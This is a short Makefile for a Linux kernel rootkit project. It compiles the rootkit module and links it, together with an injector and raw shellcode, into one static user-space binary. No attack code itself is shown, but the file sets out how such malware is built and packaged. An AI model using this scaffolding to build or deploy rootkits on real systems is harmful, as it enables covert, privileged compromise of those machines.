TARGET = rootkit
rootkit-objs = main.o hook.o
obj-m := $(TARGET).o

PWD := $(shell pwd)
KDIR := /lib/modules/$(shell uname -r)/build

all: module user

user: module
	ld -s -r -b binary rootkit.ko -o rootkit.ko.o
	gcc injector.c -c -o injector.o
	gcc -c shellcode.s -o shellcode.o
	objcopy -O binary --only-section=.text shellcode.o shellcode.bin
	ld -s -r -b binary shellcode.bin -o shellcode.o
	gcc user.c rootkit.ko.o injector.o shellcode.o  -o user -static

module:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	mv shellcode.s shellcode.bk
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	mv shellcode.bk shellcode.s
	rm *.bin
